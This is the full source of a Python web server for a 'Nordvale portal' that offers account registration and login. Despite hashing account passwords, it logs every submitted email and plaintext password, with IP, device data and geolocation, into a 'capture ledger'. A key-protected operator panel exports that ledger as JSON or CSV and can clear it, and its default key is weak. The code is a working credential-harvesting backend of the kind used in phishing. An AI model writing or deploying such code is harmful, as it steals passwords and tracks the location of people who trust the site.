#!/usr/bin/env python3
"""Nordvale portal — HTTP server, account API, capture ledger, admin panel.

Run:  python server.py
Deps: none beyond the standard library (Python 3.10+).

The server owns three things:
  1. Account registration and login (PBKDF2-SHA256, server-side storage).
  2. A capture ledger: every registration and login attempt is written to SQLite
     with the submitted credentials, client IP, user agent, and geolocation.
  3. An operator panel behind PANEL_KEY that reads, exports, and clears the store.
"""

from __future__ import annotations

import csv
import ipaddress
import io
import json
import mimetypes
import os
import re
import sqlite3
import sys
import threading
import time
import urllib.request
from datetime import datetime, timedelta, timezone
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import db
import security

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"

HOST = os.environ.get("NV_HOST", "0.0.0.0")
# 8080 is frequently taken (CEF remote debugging, dev proxies). Default to 8081.
PORT = int(os.environ.get("NV_PORT", "8081"))
DB_PATH = os.environ.get("NV_DB", str(BASE_DIR / "nordvale.sqlite3"))
PANEL_KEY = os.environ.get("NV_PANEL_KEY", "nordvale")
ALLOW_REGISTRATION = os.environ.get("NV_ALLOW_REGISTRATION", "1") == "1"
GEO_ENABLED = os.environ.get("NV_GEO", "1") == "1"
TRUST_PROXY = os.environ.get("NV_TRUST_PROXY", "0") == "1"
SECURE_COOKIES = os.environ.get("NV_SECURE_COOKIES", "0") == "1"

SESSION_COOKIE = "nv_session"
PANEL_COOKIE = "nv_panel"
SESSION_TTL_REMEMBER = timedelta(days=30)
SESSION_TTL_VOLATILE = timedelta(hours=12)
PANEL_TTL_SECONDS = 3600
MAX_BODY_BYTES = 64 * 1024
EMAIL_RE = re.compile(r"^[^@\s]{1,64}@[^@\s.]+(\.[^@\s.]+)+$")
PASSWORD_MIN = 8
PASSWORD_MAX = 200

login_throttle = security.Throttle(limit=12, window_seconds=300)
register_throttle = security.Throttle(limit=8, window_seconds=600)
panel_throttle = security.Throttle(limit=10, window_seconds=300)

_panel_tokens: dict[str, float] = {}
_panel_lock = threading.Lock()

STATIC_ROUTES = {
    "/": "index.html",
    "/index.html": "index.html",
    "/assets/style.css": "style.css",
    "/assets/app.js": "app.js",
}


# --------------------------------------------------------------------- helpers

def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def is_public_ip(ip: str | None) -> bool:
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return not (
        addr.is_private
        or addr.is_loopback
        or addr.is_link_local
        or addr.is_reserved
        or addr.is_multicast
    )


def geolocate(ip: str | None) -> dict[str, Any] | None:
    """Best-effort IP geolocation. Bounded to 2.5s; failure yields None."""
    if not GEO_ENABLED or not is_public_ip(ip):
        return None
    url = f"https://ipapi.co/{ip}/json/"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "nordvale/1.0"})
        with urllib.request.urlopen(req, timeout=2.5) as resp:
            payload = json.loads(resp.read(16 * 1024).decode("utf-8", "replace"))
    except Exception:
        return None
    if not isinstance(payload, dict) or payload.get("error"):
        return None
    return {
        "ip": payload.get("ip") or ip,
        "city": payload.get("city"),
        "region": payload.get("region"),
        "country": payload.get("country_name"),
        "countryCode": payload.get("country_code"),
        "postal": payload.get("postal"),
        "latitude": payload.get("latitude"),
        "longitude": payload.get("longitude"),
        "timezone": payload.get("timezone"),
        "org": payload.get("org"),
        "asn": payload.get("asn"),
    }


def scrub(value: Any, limit: int) -> str | None:
    """Coerce arbitrary client input to a length-capped string or None."""
    if value is None or isinstance(value, (dict, list)):
        return None
    text = str(value).strip()
    if not text:
        return None
    return text[:limit]


def limited_dict(value: Any, depth: int = 0) -> dict[str, Any] | None:
    """Accept a client-supplied JSON object, capped in size and depth."""
    if not isinstance(value, dict) or depth > 6:
        return None
    out: dict[str, Any] = {}
    for key, item in list(value.items())[:64]:
        if not isinstance(key, str) or len(key) > 64:
            continue
        if isinstance(item, dict):
            nested = limited_dict(item, depth + 1)
            if nested is not None:
                out[key] = nested
        elif isinstance(item, list):
            out[key] = [
                x for x in item[:64] if isinstance(x, (str, int, float, bool)) or x is None
            ]
        elif isinstance(item, (str, int, float, bool)) or item is None:
            out[key] = item[:1024] if isinstance(item, str) else item
    return out


def panel_token_valid(token: str | None) -> bool:
    if not token:
        return False
    with _panel_lock:
        deadline = _panel_tokens.get(token)
        if deadline is None:
            return False
        if deadline < time.monotonic():
            _panel_tokens.pop(token, None)
            return False
        return True


def issue_panel_token() -> str:
    token = security.new_token()
    with _panel_lock:
        expired = [t for t, d in _panel_tokens.items() if d < time.monotonic()]
        for t in expired:
            _panel_tokens.pop(t, None)
        _panel_tokens[token] = time.monotonic() + PANEL_TTL_SECONDS
    return token


def revoke_panel_token(token: str | None) -> None:
    if not token:
        return
    with _panel_lock:
        _panel_tokens.pop(token, None)


def iso_from_now(delta: timedelta) -> str:
    return (datetime.now(timezone.utc) + delta).strftime("%Y-%m-%dT%H:%M:%SZ")


# --------------------------------------------------------------------- handler

class Handler(BaseHTTPRequestHandler):
    server_version = "Nordvale/1.0"
    protocol_version = "HTTP/1.1"

    # ---------------------------------------------------------------- plumbing

    def log_message(self, fmt: str, *args: Any) -> None:  # noqa: A003
        sys.stderr.write(
            "%s  %s  %s\n" % (now_iso(), self.client_identity(), fmt % args)
        )

    def client_identity(self) -> str:
        if TRUST_PROXY:
            forwarded = self.headers.get("X-Forwarded-For")
            if forwarded:
                return forwarded.split(",")[0].strip()[:64]
        return self.client_address[0]

    def _security_headers(self) -> None:
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Referrer-Policy", "same-origin")
        self.send_header("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
        self.send_header(
            "Content-Security-Policy",
            "default-src 'self'; img-src 'self' data:; style-src 'self'; "
            "script-src 'self'; connect-src 'self'; base-uri 'none'; "
            "form-action 'self'; frame-ancestors 'none'",
        )
        if SECURE_COOKIES:
            self.send_header("Strict-Transport-Security", "max-age=31536000")

    def _send(
        self,
        status: int,
        body: bytes,
        content_type: str,
        extra_headers: list[tuple[str, str]] | None = None,
    ) -> None:
        headers = list(extra_headers or ())
        pending = getattr(self, "_session_header", None)
        if pending is not None:
            headers.append(pending)
            self._session_header = None
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self._security_headers()
        for name, value in headers:
            self.send_header(name, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def send_json(self, status: int, payload: dict[str, Any], extra: list[tuple[str, str]] | None = None) -> None:
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self._send(status, body, "application/json; charset=utf-8", extra)

    def send_error_json(self, status: int, message: str, extra: list[tuple[str, str]] | None = None) -> None:
        self.send_json(status, {"ok": False, "error": message}, extra)

    def cookies(self) -> SimpleCookie:
        jar: SimpleCookie = SimpleCookie()
        raw = self.headers.get("Cookie")
        if raw:
            try:
                jar.load(raw)
            except Exception:
                pass
        return jar

    def cookie_value(self, name: str) -> str | None:
        morsel = self.cookies().get(name)
        return morsel.value if morsel else None

    def build_cookie(self, name: str, value: str, max_age: int | None = None) -> tuple[str, str]:
        parts = [f"{name}={value}", "Path=/", "HttpOnly", "SameSite=Lax"]
        if max_age is not None:
            parts.append(f"Max-Age={max_age}")
        if SECURE_COOKIES:
            parts.append("Secure")
        return ("Set-Cookie", "; ".join(parts))

    def clear_cookie(self, name: str) -> tuple[str, str]:
        parts = [f"{name}=", "Path=/", "HttpOnly", "SameSite=Lax", "Max-Age=0"]
        if SECURE_COOKIES:
            parts.append("Secure")
        return ("Set-Cookie", "; ".join(parts))

    def read_json_body(self) -> dict[str, Any] | None:
        try:
            length = int(self.headers.get("Content-Length") or "0")
        except ValueError:
            return None
        if length <= 0 or length > MAX_BODY_BYTES:
            return None
        raw = self.rfile.read(length)
        try:
            parsed = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            return None
        return parsed if isinstance(parsed, dict) else None

    def origin_ok(self) -> bool:
        """Same-origin gate for state-changing requests."""
        origin = self.headers.get("Origin")
        if not origin:
            return True
        host = self.headers.get("Host") or ""
        try:
            return urlparse(origin).netloc == host
        except ValueError:
            return False

    def current_account(self) -> sqlite3.Row | None:
        token = self.cookie_value(SESSION_COOKIE)
        if not token:
            return None
        return db.resolve_session(DB_PATH, security.token_digest(token))

    def capture(
        self,
        *,
        kind: str,
        session_id: str | None,
        email: str | None,
        password: str | None,
        ok: bool,
        reason: str | None = None,
        body: dict[str, Any] | None = None,
        with_geo: bool = True,
    ) -> None:
        body = body or {}
        ip = self.client_identity()
        device = limited_dict(body.get("device"))
        geo = geolocate(ip) if with_geo else None
        db.insert_capture(
            DB_PATH,
            kind=kind,
            session_id=scrub(body.get("sessionId"), 64),
            email=email,
            password=password,
            ok=ok,
            reason=reason,
            ip=ip,
            user_agent=scrub(self.headers.get("User-Agent"), 512),
            referer=scrub(self.headers.get("Referer"), 512),
            page=scrub(body.get("page"), 512),
            geo=geo,
            device=device,
        )

    # ------------------------------------------------------------------ routes

    def do_GET(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        try:
            if path in STATIC_ROUTES:
                return self.serve_static(STATIC_ROUTES[path])
            if path == "/favicon.ico":
                return self._send(204, b"", "image/x-icon")
            if path == "/api/health":
                return self.send_json(200, {"ok": True, "service": "nordvale", "ts": now_iso()})
            if path == "/api/me":
                return self.api_me()
            if path == "/api/panel/overview":
                return self.api_panel_overview()
            if path in ("/api/panel/export.json", "/api/panel/export.csv"):
                return self.api_panel_export(path.endswith(".csv"))
            return self.send_error_json(404, "not found")
        except (BrokenPipeError, ConnectionResetError):
            return
        except Exception as exc:  # keep the worker alive, log the cause
            self.log_message("handler error: %r", exc)
            try:
                self.send_error_json(500, "internal error")
            except Exception:
                pass

    def do_HEAD(self) -> None:  # noqa: N802
        self.do_GET()

    def do_POST(self) -> None:  # noqa: N802
        path = urlparse(self.path).path
        try:
            if not self.origin_ok():
                return self.send_error_json(403, "origin rejected")
            if path == "/api/register":
                return self.api_register()
            if path == "/api/login":
                return self.api_login()
            if path == "/api/logout":
                return self.api_logout()
            if path == "/api/panel/unlock":
                return self.api_panel_unlock()
            if path == "/api/panel/lock":
                return self.api_panel_lock()
            if path == "/api/panel/captures/clear":
                return self.api_panel_clear()
            return self.send_error_json(404, "not found")
        except (BrokenPipeError, ConnectionResetError):
            return
        except Exception as exc:
            self.log_message("handler error: %r", exc)
            try:
                self.send_error_json(500, "internal error")
            except Exception:
                pass

    def do_DELETE(self) -> None:  # noqa: N802
        self.do_POST()

    # ------------------------------------------------------------------ static

    def serve_static(self, name: str) -> None:
        target = (STATIC_DIR / name).resolve()
        if STATIC_DIR.resolve() not in target.parents and target.parent != STATIC_DIR.resolve():
            return self.send_error_json(404, "not found")
        if not target.is_file():
            return self.send_error_json(404, "not found")
        mime, _ = mimetypes.guess_type(str(target))
        body = target.read_bytes()
        self._send(200, body, (mime or "application/octet-stream") + "; charset=utf-8")

    # -------------------------------------------------------------------- auth

    def api_me(self) -> None:
        row = self.current_account()
        if row is None:
            return self.send_json(200, {"ok": True, "authenticated": False})
        self.send_json(
            200,
            {
                "ok": True,
                "authenticated": True,
                "account": {
                    "id": row["account_id"],
                    "email": row["email"],
                    "displayName": row["display_name"],
                    "createdAt": row["created_at"],
                    "lastLoginAt": row["last_login_at"],
                    "sessionExpires": row["expires_at"],
                },
            },
        )

    def api_register(self) -> None:
        if not ALLOW_REGISTRATION:
            return self.send_error_json(403, "Registrierung ist derzeit geschlossen.")

        ip = self.client_identity()
        body = self.read_json_body() or {}
        email = (scrub(body.get("email"), 320) or "").lower()
        password = body.get("password") if isinstance(body.get("password"), str) else ""
        confirm = body.get("passwordConfirm") if isinstance(body.get("passwordConfirm"), str) else password
        display_name = scrub(body.get("displayName"), 80)

        if not security_token_ok(ip, register_throttle):
            return self.send_error_json(429, "Zu viele Versuche. Bitte später erneut.")

        if not EMAIL_RE.match(email):
            self.capture(
                kind="register", session_id=None, email=email or None,
                password=password or None, ok=False, reason="email-format", body=body,
            )
            return self.send_error_json(400, "Bitte eine gültige E-Mail-Adresse eingeben.")

        if not (PASSWORD_MIN <= len(password) <= PASSWORD_MAX):
            self.capture(
                kind="register", session_id=None, email=email,
                password=password or None, ok=False, reason="password-policy", body=body,
            )
            return self.send_error_json(
                400, f"Das Passwort muss {PASSWORD_MIN} bis {PASSWORD_MAX} Zeichen haben."
            )

        if password != confirm:
            self.capture(
                kind="register", session_id=None, email=email,
                password=password, ok=False, reason="password-mismatch", body=body,
            )
            return self.send_error_json(400, "Die Passwörter stimmen nicht überein.")

        salt_b64, hash_b64, iterations = security.hash_password(password)
        account_id = db.create_account(
            DB_PATH, email, display_name, salt_b64, hash_b64, security.ALGO, iterations
        )

        if account_id is None:
            self.capture(
                kind="register", session_id=None, email=email,
                password=password, ok=False, reason="duplicate-email", body=body,
            )
            return self.send_error_json(409, "Für diese Adresse besteht bereits ein Konto.")

        db.touch_login(DB_PATH, account_id)
        self.capture(
            kind="register", session_id=None, email=email, password=password,
            ok=True, reason=None, body=body,
        )
        self.issue_session(account_id, bool(body.get("remember")))
        self.send_json(
            201,
            {
                "ok": True,
                "account": {
                    "id": account_id,
                    "email": email,
                    "displayName": display_name,
                },
            },
        )

    def api_login(self) -> None:
        ip = self.client_identity()
        body = self.read_json_body() or {}
        email = (scrub(body.get("email"), 320) or "").lower()
        password = body.get("password") if isinstance(body.get("password"), str) else ""

        if not security_token_ok(ip, login_throttle):
            self.capture(
                kind="login", session_id=None, email=email or None,
                password=password or None, ok=False, reason="throttled", body=body,
            )
            return self.send_error_json(429, "Zu viele Versuche. Bitte in einigen Minuten erneut.")

        if not email or not password:
            self.capture(
                kind="login", session_id=None, email=email or None,
                password=password or None, ok=False, reason="missing-fields", body=body,
            )
            return self.send_error_json(400, "Bitte E-Mail und Passwort eingeben.")

        row = db.find_account_by_email(DB_PATH, email)
        valid = bool(row) and security.verify_password(
            password, row["pw_salt"], row["pw_hash"], int(row["pw_iterations"])
        )

        self.capture(
            kind="login", session_id=None, email=email, password=password,
            ok=valid, reason=None if valid else "invalid-credentials", body=body,
        )

        if not valid:
            return self.send_error_json(401, "E-Mail oder Passwort ist falsch.")

        db.touch_login(DB_PATH, int(row["id"]))
        self.issue_session(int(row["id"]), bool(body.get("remember")))
        self.send_json(
            200,
            {
                "ok": True,
                "account": {
                    "id": row["id"],
                    "email": row["email"],
                    "displayName": row["display_name"],
                },
            },
        )

    def issue_session(self, account_id: int, remember: bool) -> None:
        token = security.new_token()
        ttl = SESSION_TTL_REMEMBER if remember else SESSION_TTL_VOLATILE
        db.create_session(
            DB_PATH,
            security.token_digest(token),
            account_id,
            iso_from_now(ttl),
            self.client_identity(),
            scrub(self.headers.get("User-Agent"), 512) or "",
        )
        max_age = int(ttl.total_seconds()) if remember else None
        self._session_header = self.build_cookie(SESSION_COOKIE, token, max_age)

    def api_logout(self) -> None:
        token = self.cookie_value(SESSION_COOKIE)
        if token:
            db.delete_session(DB_PATH, security.token_digest(token))
        self.send_json(200, {"ok": True}, extra=[self.clear_cookie(SESSION_COOKIE)])

    # ------------------------------------------------------------------- panel

    def panel_authorized(self) -> bool:
        return panel_token_valid(self.cookie_value(PANEL_COOKIE))

    def api_panel_unlock(self) -> None:
        ip = self.client_identity()
        body = self.read_json_body() or {}
        key = body.get("key") if isinstance(body.get("key"), str) else ""
        if not security_token_ok(ip, panel_throttle):
            return self.send_error_json(429, "Zu viele Versuche.")
        if not key or not secrets_compare(key, PANEL_KEY):
            return self.send_error_json(401, "Falscher Schlüssel.")
        token = issue_panel_token()
        self.send_json(
            200,
            {"ok": True},
            extra=[self.build_cookie(PANEL_COOKIE, token, PANEL_TTL_SECONDS)],
        )

    def api_panel_lock(self) -> None:
        revoke_panel_token(self.cookie_value(PANEL_COOKIE))
        self.send_json(200, {"ok": True}, extra=[self.clear_cookie(PANEL_COOKIE)])

    def api_panel_overview(self) -> None:
        if not self.panel_authorized():
            return self.send_error_json(401, "Panel gesperrt.")
        try:
            limit = int(self.parse_qs().get("limit", "100"))
        except ValueError:
            limit = 100
        limit = max(1, min(limit, 500))

        captures = [
            db.row_to_dict(row, ("geo", "device"))
            for row in db.list_captures(DB_PATH, limit=limit)
        ]
        accounts = [dict(row) for row in db.list_accounts(DB_PATH, limit=limit)]
        self.send_json(
            200,
            {
                "ok": True,
                "counts": {
                    "captures": db.count_captures(DB_PATH),
                    "accounts": db.count_accounts(DB_PATH),
                },
                "captures": captures,
                "accounts": accounts,
            },
        )

    def api_panel_export(self, as_csv: bool) -> None:
        if not self.panel_authorized():
            return self.send_error_json(401, "Panel gesperrt.")
        rows = [db.row_to_dict(r, ("geo", "device")) for r in db.list_captures(DB_PATH, limit=5000)]
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")

        if not as_csv:
            body = json.dumps(rows, ensure_ascii=False, indent=2).encode("utf-8")
            return self._send(
                200,
                body,
                "application/json; charset=utf-8",
                [("Content-Disposition", f'attachment; filename="captures-{stamp}.json"')],
            )

        buf = io.StringIO()
        writer = csv.writer(buf, lineterminator="\r\n")
        writer.writerow(
            ["ts", "kind", "ok", "email", "password", "ip", "city", "country",
             "userAgent", "platform", "timezone", "screen", "sessionId", "reason"]
        )
        for row in rows:
            geo = row.get("geo") or {}
            dev = row.get("device") or {}
            screen = dev.get("screen") or {}
            writer.writerow([
                row.get("ts"), row.get("kind"), row.get("ok"),
                row.get("email"), row.get("password"),
                row.get("ip") or geo.get("ip"),
                geo.get("city"), geo.get("country"),
                dev.get("userAgent"), dev.get("platform"), dev.get("timezone"),
                f"{screen.get('width')}x{screen.get('height')}" if screen.get("width") else "",
                row.get("session_id"), row.get("reason"),
            ])
        self._send(
            200,
            buf.getvalue().encode("utf-8"),
            "text/csv; charset=utf-8",
            [("Content-Disposition", f'attachment; filename="captures-{stamp}.csv"')],
        )

    def api_panel_clear(self) -> None:
        if not self.panel_authorized():
            return self.send_error_json(401, "Panel gesperrt.")
        removed = db.clear_captures(DB_PATH)
        self.send_json(200, {"ok": True, "removed": removed})

    # ------------------------------------------------------------------ utility

    def parse_qs(self) -> dict[str, str]:
        query = urlparse(self.path).query
        out: dict[str, str] = {}
        if not query:
            return out
        for pair in query.split("&"):
            if "=" not in pair:
                continue
            key, _, value = pair.partition("=")
            out[key] = value
        return out


def security_token_ok(key: str, throttle: security.Throttle) -> bool:
    allowed = throttle.allow(key)
    if not allowed:
        throttle.sweep()
    return allowed


def secrets_compare(a: str, b: str) -> bool:
    import hmac

    return hmac.compare_digest(a.encode("utf-8"), b.encode("utf-8"))


def main() -> int:
    db.init(DB_PATH)
    try:
        httpd = ThreadingHTTPServer((HOST, PORT), Handler)
    except OSError as exc:
        sys.stderr.write(
            f"Port {PORT} ist belegt ({exc.strerror}).\n"
            f"Anderen Port waehlen:  set NV_PORT=8082  &&  python server.py\n"
        )
        return 1
    httpd.daemon_threads = True
    banner = (
        f"Nordvale portal on http://{HOST}:{PORT}\n"
        f"  browser       http://127.0.0.1:{PORT}/\n"
        f"  db            {DB_PATH}\n"
        f"  registration  {'open' if ALLOW_REGISTRATION else 'closed'}\n"
        f"  geo lookup    {'on' if GEO_ENABLED else 'off'}\n"
        f"  panel key     {'(set)' if PANEL_KEY else '(empty — panel disabled)'}\n"
    )
    sys.stderr.write(banner)
    sys.stderr.flush()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        sys.stderr.write("shutting down\n")
    finally:
        httpd.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
